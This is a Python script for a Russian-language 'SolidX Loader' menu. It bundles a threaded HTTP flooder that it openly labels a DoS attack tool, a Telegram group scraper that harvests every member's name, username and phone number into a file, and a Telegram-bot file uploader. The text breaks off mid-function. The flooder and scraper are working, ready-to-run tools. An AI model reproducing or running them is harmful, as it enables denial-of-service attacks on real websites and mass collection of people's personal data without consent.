import os
import sys
import time
import asyncio
import subprocess
import concurrent.futures
import json
import tempfile
import socket
import getpass
import zipfile
import tarfile
import shutil
import re

def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except subprocess.CalledProcessError:
        sys.exit(1)

try:
    import requests
except ImportError:
    install_package("requests")
    import requests

try:
    from telethon import TelegramClient, errors
except ImportError:
    install_package("telethon")
    from telethon import TelegramClient, errors

try:
    import telebot
except ImportError:
    install_package("pyTelegramBotAPI")
    import telebot

try:
    import tkinter as tk
    from tkinter import filedialog
except ImportError:
    pass

if sys.platform == "win32":
    os.system("title SolidX Loader")
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

CONFIG_FILE = "tg_config.txt"
SESSION_NAME = "solidx_session"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_logo():
    print(r"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢀⣴⡾⣿⣿⣿⣿⡇⠂⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      ______________________________
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⣌⠀⠀⠀⠀⢀⡘⢪⠏⢸⢿⣿⣿⣻⠿⠄⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿     / \                             \
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢠⠐⠀⣠⠃⠭⠁⣠⣶⠶⠁⡄⠄⠀⡘⠉⠙⢹⣿⣶⣄⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿    |   | 1.SolidX (Dos)             |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣶⢦⣼⣵⣶⣿⣱⢅⠐⢿⡗⠛⠚⠌⠀⠀⠃⠀⠀⠻⢡⠉⠘⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿     \_ | 2.SolidY (Парсер TG)       |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠸⠿⠟⣿⣿⣿⣱⣿⡿⠁⢀⡀⠀⠀⠀⠀⠂⠀⠀⠀⠁⠀⠀⠀⠀⠀⢰⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿        | 3.SolidM (Мануалы, софты..)|
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠸⠿⠟⣿⣿⣿⣱⣿⡿⠁⢀⡀⠀⠀⠀⠀⠂⠀⠀⠀⠁⠀⠀⠀⠀⠀⢰⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿        | 0. Выход                   |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠸⠿⠟⣿⣿⣿⣱⣿⡿⠁⢀⡀⠀⠀⠀⠀⠂⠀⠀⠀⠁⠀⠀⠀⠀⠀⢰⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠨⠀⣿⠋⢙⢩⠟⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⠀⡀⠀⠀⠈⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢈⠰⠃⠀⢸⠸⠐⠀⠀⠀⠙⣿⣿⣿⣶⢤⠀⠀⠀⠀⠀⠀⠀⠀⠂⠂⠀⢇⠀⠀⡇⢸⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⡖⣷⣮⣄⠀⢰⠌⠀⠀⠀⠆⠀⠀⠀⠈⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢐⠀⡆⡇⣾⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣅⠁⢟⣿⣿⠦⢴⣷⢾⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣄⠀⠁⠀⣼⣷⢱⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡏⡈⠀⠀⠋⠄⠘⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠩⠉⠻⢀⣠⡼⣿⡇⣾⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠘⢠⣧⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠋⠀⠠⢸⣿⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⢿⣿⡦⡇⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⣼⣿⣆⡀⢀⣿⣿⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠄⠀⠀⠘⠋⠁⠒⠀⠀⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢾⡻⢹⠏⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿        |                            |
⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⣀⠁⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      |                            |
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣴⢠⣿⡟⠀⠀⡐⠀⠀⠀⡀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      |                            |
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠛⠿⠿⠁⠤⠼⠃⠀⢀⣼⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      |                            |
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠤⠒⠈⠁⠀⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      |                            |
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀  ⣀⣀⡀⠀⠀⠀⠀⠀⢀⠊⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿     |                            |
⣿⣿⡿⠁⠀⠀⠀⠀⢠⣄⡀⠀⠀⡠⠤⢤⠀⢦⡀⡰⠀⠀⠀⡼⡀⡸⡄⢸⣀⣀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿        |                            |
⣿⡟⠁⠀⠀⠀⠀⠀⢸⠀⠈⢢⢸⠀⠀⢠⠂⢀⠝⢅⠀⠀⠀⡇⢣⠇⢣⠘⣀⣀⡀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿        |                            |
⣿⠁⠀⠀⠀⠀⠀⠀⠈⠤⠤⠂⠈⠓⠒⠋⠀⠋⠀⠈⠁⠀⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿        |                            |
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       |                            |
⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       |                            |
⣿⠐⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       |                            |
⣿⣷⣄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       |   _________________________|___
⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       |  /                            /
⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       \_/____________________________/
⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
""")

class SolidX:
    @staticmethod
    def show_instructions():
        clear_screen()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                  ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ                ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print("\n[ОПИСАНИЕ]")
        print("SolidX - это инструмент для тестирования нагрузки на веб-серверы.")
        print("Отправляет множественные HTTP-запросы к указанному URL.\n")
        print("[КАК ЭТО РАБОТАЕТ]")
        print("1. Введите URL (например: https://google.com)")
        print("2. Укажите количество запросов.")
        print("3. Программа запустит потоки и покажет статус-коды.\n")
        input("Нажмите Enter, чтобы вернуться... ")

    @staticmethod
    def send_request(url, i):
        try:
            response = requests.get(url, timeout=5)
            print(f"Request {i+1}: Status code {response.status_code}")
        except Exception as e:
            print(f"Error sending request {i+1}: {e}")

    @staticmethod
    def start_attack():
        target = input("Enter the URL: ").strip()
        if not target.startswith("http"):
            target = "http://" + target
            
        amount_str = input("Enter the number of requests: ")
        try:
            count = int(amount_str)
        except ValueError:
            count = 10
        
        print(f"\nЗапуск {count} потоков на {target}...")
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(SolidX.send_request, target, i) for i in range(count)]
            concurrent.futures.wait(futures)
        
        input("\nГотово. Нажмите Enter...")

    @staticmethod
    def menu():
        while True:
            clear_screen()
            print(r"""
  _____       _ _     ___   __ 
 / ____|     | (_)   | \ \ / / 
| (___   ___ | |_  __| |\ V /  
 \___ \ / _ \| | |/ _` | > <   
 ____) | (_) | | | (_| |/ . \  
|_____/ \___/|_|_|\__,_/_/ \_\ (Dos инструмент)
            """)
            print("\nГЛАВНОЕ МЕНЮ SolidX:")
            print("1. Как это работает? (Инструкция)")
            print("2. Начать аттаку")
            print("0. Назад")
            
            choice = input("\n> Введите номер: ")
            if choice == "1":
                SolidX.show_instructions()
            elif choice == "2":
                SolidX.start_attack()
            elif choice == "0":
                break

class SolidY:
    @staticmethod
    def show_instructions():
        clear_screen()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                  ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ                ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print("\n[ОПИСАНИЕ]")
        print("SolidY Parser - сбор данных участников групп Telegram.\n")
        print("[ВАЖНО]")
        print("Нужны API ID и API Hash с сайта my.telegram.org.\n")
        input("Нажмите Enter, чтобы вернуться... ")

    @staticmethod
    def get_credentials():
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as f:
                lines = f.read().splitlines()
                if len(lines) >= 2:
                    return lines[0], lines[1]
        
        print("\n[НАСТРОЙКА API]")
        api_id = input("Введите ваш API ID: ").strip()
        api_hash = input("Введите ваш API Hash: ").strip()
        
        with open(CONFIG_FILE, "w") as f:
            f.write(f"{api_id}\n{api_hash}")
        return api_id, api_hash

    @staticmethod
    async def run_parser():
        api_id, api_hash = SolidY.get_credentials()
        
        print("\n[ЗАПУСК ПАРСИНГА]")
        target = input("Введите Username, ID или Ссылку на группу: ").strip()
        
        if target.lstrip('-').isdigit():
            target = int(target)

        client = TelegramClient(SESSION_NAME, api_id, api_hash)
        
        try:
            await client.start()
            print("Авторизация успешна!")
            
            try:
                entity = await client.get_entity(target)
                print(f"Группа найдена: {getattr(entity, 'title', 'Unknown')}")
            except Exception as e:
                print(f"Ошибка: Не удалось найти объект. {e}")
                return

            print("Начинаю сбор участников...")
            members_found = 0
            filename = "members.txt"
            
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Участники группы: {getattr(entity, 'title', target)}\n\n")
                
                async for user in client.iter_participants(entity):
                    name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                    username = f"@{user.username}" if user.username else "no_username"
                    phone = user.phone if user.phone else "no_phone"
                    
                    line = f"{name} | {username} | {phone}"
                    f.write(line + "\n")
                    
                    members_found += 1
                    if members_found % 50 == 0:
                        print(f"Собрано: {members_found}...", end='\r')
            
            print(f"\n\nГотово! Список сохранен в: {filename}")
            print(f"Всего собрано: {members_found}")

        except errors.FloodWaitError as e:
            print(f"\n[LIMIT] Ограничение Telegram: Ждать {e.seconds} сек.")
        except Exception as e:
            print(f"\n[ERROR] Произошла ошибка: {e}")
        finally:
            await client.disconnect()
            input("\nНажмите Enter, чтобы продолжить...")

    @staticmethod
    def menu():
        while True:
            clear_screen()
            print(r"""
   _____       _ _     ___     __
  / ____|     | (_)   | \ \   / /
 | (___   ___ | |_  __| |\ \_/ / 
  \___ \ / _ \| | |/ _` | \   /  
  ____) | (_) | | | (_| |  | |   
 |_____/ \___/|_|_\__,_|   |_|   (Парсер групп Telegram)
            """)
            print("ГЛАВНОЕ МЕНЮ SolidY:")
            print("1. Как это работает? (Инструкция)")
            print("2. Начать парсинг")
            print("0. Назад")
            
            choice = input("\nВыберите пункт: ").strip()
            
            if choice == '1':
                SolidY.show_instructions()
            elif choice == '2':
                asyncio.run(SolidY.run_parser())
            elif choice == '0':
                break

class SolidM:
    TOKEN = ''
    DB_CHAT_ID = 0
    
    TEMP_DIR = tempfile.gettempdir()
    DB_FILENAME = "solidm_db.json"
    
    EXTENSIONS = {
        "text":  [".txt", ".docx", ".pdf", ".rtf", ".odt"],
        "graph": [".jpeg", ".png", ".jpg", ".bmp", ".gif", ".psd"],
        "audio": [".mp3", ".wav", ".ogg", ".flac"],
        "video": [".mp4", ".avi", ".mov", ".mkv"],
        "arch":  [".zip", ".rar", ".7z", ".tar", ".gz"],
        "exec":  [".py", ".exe", ".bat", ".sh", ".rb", ".msi"],
        "other": []
    }
    
    SECTION_NAMES = {
        "text": "Текстовые документы",
        "graph": "Графика",
        "audio": "Аудио",
        "video": "Видео",
        "arch": "Архивы",
        "exec": "Исполняемые файлы",
        "other": "Разное"
    }
    
    TG_ICONS = {
        "text": "📄", "graph": "🖼", "audio": "🎵",
        "video": "🎬", "arch": "📦", "exec": "⚙️", "other": "📂"
    }
    
    def __init__(self):
        if not self.TOKEN:
            self.TOKEN = input("Введите токен бота: ").strip()
        if not self.DB_CHAT_ID:
            try:
                self.DB_CHAT_ID = int(input("Введите Chat ID базы данных: ").strip())
            except ValueError:
                print("ID чата должен быть числом.")
                sys.exit(1)
                
        self.bot = telebot.TeleBot(self.TOKEN)
        self.LOCAL_DB_PATH = os.path.join(self.TEMP_DIR, self.DB_FILENAME)
    
    @staticmethod
    def get_pc_identity():
        try:
            user = getpass.getuser()
            host = socket.gethostname()
            return f"{user}@{host}"
        except:
            return "Unknown User"
    
    @staticmethod
    def format_size(size_bytes):
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.2f} KB"
        else:
            return f"{size_bytes / (1024 * 1024):.2f} MB"
    
    def get_file_category(self, file_path):
        _, ext = os.path.splitext(file_path)
        ext = ext.lower()
        for cat_key, exts in self.EXTENSIONS.items():
            if ext in exts:
                return cat_key
        return "other"
    
    @staticmethod
    def extract_archive(archive_path, extract_to):
        try:
            _, ext = os.path.splitext(archive_path)
            ext = ext.lower()
            if ext == '.zip':
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    zip_ref.extractall(extract_to)
            elif ext in ['.tar', '.gz']:
                with tarfile.open(archive_path, 'r:*') as tar_ref:
                    tar_ref.extractall(extract_to)
            elif ext == '.rar':
                return False
            elif ext == '.7z':
                return False
            else:
                return False
            return True
        except Exception as e:
            print(f"[ERROR] Ошибка распаковки: {e}")
            return False
    
    @staticmethod
    def collect_files_from_folder(folder_path):
        files = []
        for root, dirs, filenames in os.walk(folder_path):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                files.append(file_path)
        return files
    
    @staticmethod
    def select_file_dialog():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        file_path = filedialog.askopenfilename(title="SolidM: Выбор файла")
        root.destroy()
        return file_path
    
    @staticmethod
    def select_folder_dialog():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        folder_path = filedialog.askdirectory(title="SolidM: Выбор папки")
        root.destroy()
        return folder_path
    
    @staticmethod
    def select_archive_dialog():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        file_path = filedialog.askopenfilename(
            title="SolidM: Выбор архива",
            filetypes=[("Архивы", "*.zip *.rar *.7z *.tar *.gz *.tar.gz")]
        )
        root.destroy()
        return file_path
    
    def download_db_from_cloud(self):
        print("[SYNC] Подключение к серверу SolidM...")
        try:
            chat = self.bot.get_chat(self.DB_CHAT_ID)
            pinned_msg = chat.pinned_message
            if not pinned_msg or not pinned_msg.document:
                print("[INFO] База данных не найдена. Создание новой...")
                empty_db = {"files": [], "banned": []}
                with open(self.LOCAL_DB_PATH, "w", encoding="utf-8") as f:
                    json.dump(empty_db, f)
                return
            file_info = self.bot.get_file(pinned_msg.document.file_id)
            downloaded_file = self.bot.download_file(file_info.file_path)
            with open(self.LOCAL_DB_PATH, 'wb') as new_file:
                new_file.write(downloaded_file)
            print(f"[OK] База данных успешно обновлена.")
            time.sleep(0.5)
        except Exception as e:
            print(f"[ERROR] Ошибка соединения: {e}")
            if not os.path.exists(self.LOCAL_DB_PATH):
                with open(self.LOCAL_DB_PATH, "w", encoding="utf-8") as f:
                    json.dump({"files": [], "banned": []}, f)
            time.sleep(1)
    
    def upload_db_to_cloud(self, notification=None):
        print("[SYNC] Отправка обновленной базы данных на сервер...")
        try:
            if notification:
                self.bot.send_message(self.DB_CHAT_ID, notification, parse_mode='HTML')
            with open(self.LOCAL_DB_PATH, 'rb') as f:
                msg = self.bot.send_document(self.DB_CHAT_ID, f, caption="#SYSTEM: Database Update")
            try:
                self.bot.unpin_all_chat_messages(self.DB_CHAT_ID)
            except:
                pass
            self.bot.pin_chat_message(self.DB_CHAT_ID, msg.message_id)
            print("[OK] Сервер синхронизирован.")
        except Exception as e:
            print(f"[ERROR] Сбой синхронизации: {e}")
    
    def load_db(self):
        if not os.path.exists(self.LOCAL_DB_PATH):
            return {"files": [], "banned": []}
        try:
            with open(self.LOCAL_DB_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    return {"files": data, "banned": []}
                return data
        except:
            return {"files": [], "banned": []}
    
    def save_db_local(self, data):
        with open(self.LOCAL_DB_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    
    def add_file_record(self, name, file_id, category, author, size_str):
        db = self.load_db()
        db['files'].append({
            "name": name,
            "file_id": file_id,
            "category": category,
            "author": author,
            "size": size_str,
            "date": time.strftime("%d.%m.%Y %H:%M")
        })
        self.save_db_local(db)
    
    @staticmethod
    def extract_retry_after(error_message):
        try:
            match = re.search(r'retry after (\d+)', str(error_message), re.IGNORECASE)
            if match:
                return int(match.group(1))
        except:
            pass
        return None
    
    def upload_single_file(self, file_path, cat_key, pc_name, files_list, max_retries=3):
        file_name = os.path.basename(file_path)
        _, ext = os.path.splitext(file_name)
        ext = ext.lower()
        file_size = os.path.getsize(file_path)
        size_str = self.format_size(file_size)
        file_exists = False
        for record in files_list:
            if record['name'] == file_name:
                file_exists = True
                break
        if file_exists:
            return False, f"Файл '{file_name}' уже существует"
        if file_size == 0:
            return False, f"Файл '{file_name}' пустой (0 байт)"
        if cat_key != "other" and ext not in self.EXTENSIONS[cat_key]:
            return False, f"Формат '{ext}' не подходит для раздела '{self.SECTION_NAMES[cat_key]}'"
        icon = self.TG_ICONS.get(cat_key, "📁")
        caption_text = (
            f"<b>НОВАЯ ЗАГРУЗКА</b>\n"
            f"────────────────\n"
            f"{icon} <b>Файл:</b> {file_name}\n"
            f"💾 <b>Размер:</b> {size_str}\n"
            f"📂 <b>Раздел:</b> {self.SECTION_NAMES[cat_key]}\n"
            f"👤 <b>Загрузил:</b> {pc_name}"
        )
        for attempt in range(max_retries):
            try:
                with open(file_path, 'rb') as f:
                    msg = self.bot.send_document(self.DB_CHAT_ID, f, caption=caption_text, parse_mode='HTML')
                self.add_file_record(file_name, msg.document.file_id, cat_key, pc_name, size_str)
                return True, f"Успешно загружено: {file_name}"
            except Exception as e:
                error_str = str(e)
                if "429" in error_str or "Too Many Requests" in error_str:
                    retry_after = self.extract_retry_after(error_str)
                    if retry_after:
                        wait_time = retry_after + 1
                        print(f"[WAIT] Лимит запросов. Ожидание {wait_time} секунд...")
                        for remaining in range(wait_time, 0, -1):
                            print(f"\r[WAIT] Осталось: {remaining} сек...", end='', flush=True)
                            time.sleep(1)
                        print("\r[WAIT] Продолжаем загрузку...        ")
                        continue
                    else:
                        if attempt < max_retries - 1:
                            wait_time = 60
                            print(f"[WAIT] Лимит запросов. Ожидание {wait_time} секунд...")
                            for remaining in range(wait_time, 0, -10):
                                print(f"\r[WAIT] Осталось: {remaining} сек...", end='', flush=True)
                                time.sleep(10)
                            print("\r[WAIT] Продолжаем загрузку...        ")
                            continue
                return False, f"Ошибка API: {e}"
        return False, f"Ошибка API после {max_retries} попыток: {error_str}"
    
    def upload_process(self):
        pc_name = self.get_pc_identity()
        db = self.load_db()
        if pc_name in db.get('banned', []):
            clear_screen()
            print("⛔ ДОСТУП ЗАПРЕЩЕН")
            print("Ваш пользователь заблокирован администратором.")
            input("Enter для выхода...")
            return
        while True:
            clear_screen()
            print(f":User {pc_name}")
            print("----------------------------------------")
            print("       ЗАГРУЗКА ФАЙЛОВ (UPLOAD)        ")
            print("----------------------------------------")
            files_list = db.get('files', [])
            print(f"Файлов в базе: {len(files_list)}")
            print("\nВыберите тип загрузки:")
            print("1. Один файл")
            print("2. Папка (все файлы из папки)")
            print("3. Архив (распаковка и загрузка всех файлов)")
            print("0. Назад")
            upload_type = input("\nВаш выбор > ")
            if upload_type == '0': return
            if upload_type == '1':
                clear_screen()
                print("----------------------------------------")
                print("       ЗАГРУЗКА ОДНОГО ФАЙЛА          ")
                print("----------------------------------------")
                print("\nВыберите категорию:")
                cats = list(self.EXTENSIONS.keys())
                for i, key in enumerate(cats, 1):
                    print(f"{i}. {self.SECTION_NAMES[key]}")
                print("0. Назад")
                choice = input("\nВаш выбор > ")
                if choice == '0': continue
                try:
                    cat_key = cats[int(choice)-1]
                except:
                    continue
                print(f"\n[INFO] Открывается проводник для раздела: {self.SECTION_NAMES[cat_key]}...")
                time.sleep(0.5)
                file_path = self.select_file_dialog()
                if not file_path:
                    print("[INFO] Файл не выбран.")
                    time.sleep(1)
                    continue
                file_name = os.path.basename(file_path)
                file_size = os.path.getsize(file_path)
                size_str = self.format_size(file_size)
                print("\nПРОВЕРКА ДАННЫХ:")
                print(f"Имя:       {file_name}")
                print(f"Размер:    {size_str}")
                print(f"Категория: {self.SECTION_NAMES[cat_key]}")
                if input("\nЗагрузить на сервер? (y/n) > ").lower() == 'y':
                    print("\n[....] Загрузка файла в Telegram...")
                    success, message = self.upload_single_file(file_path, cat_key, pc_name, files_list)
                    if success:
                        self.upload_db_to_cloud()
                        print(f"[OK] {message}")
                        db = self.load_db()
                        time.sleep(2)
                    else:
                        print(f"[ERROR] {message}")
                        input("Enter...")
            elif upload_type == '2':
                clear_screen()
                print("----------------------------------------")
                print("       ЗАГРУЗКА ПАПКИ                  ")
                print("----------------------------------------")
                print("\n[INFO] Выберите папку для загрузки...")
                time.sleep(0.5)
                folder_path = self.select_folder_dialog()
                if not folder_path:
                    print("[INFO] Папка не выбрана.")
                    time.sleep(1)
                    continue
                files_to_upload = self.collect_files_from_folder(folder_path)
                if not files_to_upload:
                    print("[INFO] В папке нет файлов.")
                    time.sleep(1)
                    continue
                print(f"\n[INFO] Найдено файлов: {len(files_to_upload)}")
                if input("Продолжить загрузку всех файлов? (y/n) > ").lower() != 'y':
                    continue
                db = self.load_db()
                files_list = db.get('files', [])
                uploaded = 0
                skipped = 0
                errors = 0
                for i, file_path in enumerate(files_to_upload, 1):
                    file_name = os.path.basename(file_path)
                    cat_key = self.get_file_category(file_path)
                    print(f"\n[{i}/{len(files_to_upload)}] Обработка: {file_name}...")
                    success, message = self.upload_single_file(file_path, cat_key, pc_name, files_list)
                    if success:
                        uploaded += 1
                        files_list = self.load_db().get('files', [])
                        print(f"[OK] {message}")
                    else:
                        if "уже существует" in message:
                            skipped += 1
                            print(f"[SKIP] {message}")
                        else:
                            errors += 1
                            print(f"[ERROR] {message}")
                    if i < len(files_to_upload):
                        time.sleep(1)
                self.upload_db_to_cloud()
                print(f"\n{'='*40}")
                print(f"РЕЗУЛЬТАТЫ ЗАГРУЗКИ:")
                print(f"Успешно: {uploaded}")
                print(f"Пропущено: {skipped}")
                print(f"Ошибок: {errors}")
                print(f"{'='*40}")
                input("\nEnter для продолжения...")
            elif upload_type == '3':
                clear_screen()
                print("----------------------------------------")
                print("       ЗАГРУЗКА АРХИВА                 ")
                print("----------------------------------------")
                print("\n[INFO] Выберите архив для распаковки и загрузки...")
                time.sleep(0.5)
                archive_path = self.select_archive_dialog()
                if not archive_path:
                    print("[INFO] Архив не выбран.")
                    time.sleep(1)
                    continue
                archive_name = os.path.basename(archive_path)
                _, ext = os.path.splitext(archive_name)
                ext = ext.lower()
                if ext not in ['.zip', '.tar', '.gz']:
                    print(f"[ERROR] Формат архива '{ext}' не поддерживается.")
                    print("Поддерживаются: .zip, .tar, .gz")
                    input("Enter...")
                    continue
                temp_extract_dir = os.path.join(self.TEMP_DIR, f"solidm_extract_{int(time.time())}")
                os.makedirs(temp_extract_dir, exist_ok=True)
                print(f"\n[....] Распаковка архива '{archive_name}'...")
                if not self.extract_archive(archive_path, temp_extract_dir):
                    print("[ERROR] Не удалось распаковать архив.")
                    shutil.rmtree(temp_extract_dir, ignore_errors=True)
                    input("Enter...")
                    continue
                files_to_upload = self.collect_files_from_folder(temp_extract_dir)
                if not files_to_upload:
                    print("[INFO] В архиве нет файлов.")
                    shutil.rmtree(temp_extract_dir, ignore_errors=True)
                    time.sleep(1)
                    continue
                print(f"[OK] Распаковано файлов: {len(files_to_upload)}")
                if input("Продолжить загрузку всех файлов? (y/n) > ").lower() != 'y':
